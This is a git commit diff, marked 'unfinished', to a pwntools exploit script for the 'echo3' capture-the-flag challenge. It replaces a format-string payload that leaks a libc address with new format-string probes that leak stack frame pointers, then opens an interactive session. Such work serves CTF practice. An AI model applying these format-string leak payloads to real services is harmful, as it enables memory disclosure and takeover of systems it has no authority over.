7e6f47dacd666be86b3cdcbc350e9ef77b5edc1a
M4xW4n9 <aboultraman@gmail.com>
2018-05-24 22:39:26 +0800

    unfinished

--- inndy_echo3/exp.py
+++ inndy_echo3/exp.py
@@ -26,15 +26,18 @@ def DEBUG(cmd = ""):
     gdb.attach(io, cmd)
 
 if __name__ == "__main__":
-    payload = "%51$p||"
-    io.send(payload)
-    libcBase = int(io.recvuntil("||", drop = True), 16) - 246 - libc.sym['__libc_start_main']
-    if sys.argv[1] == "r":
-        libcBase -= 1
-    success("libcBase -> {:#x}".format(libcBase))
-    pause()
-    #  DEBUG("b *0x8048646\nc")
+    io.sendline("%18$p")
+    mainEbp = int(io.recvuntil("\n", drop = True), 16)
+    success("mainEbp -> {:#x}".format(mainEbp))
+    hardfmtEbp = mainEbp - 0x50
+    success("hardfmtEbp -> {:#x}".format(hardfmtEbp))
+
+    offset = (mainEbp - hardfmtEbp) / 4
+    io.sendline("%{}$p.%{}$p.%{}$p".format(offset - 1, offset, offset))
     
+    
+
+     
     io.interactive()
     io.close()
 
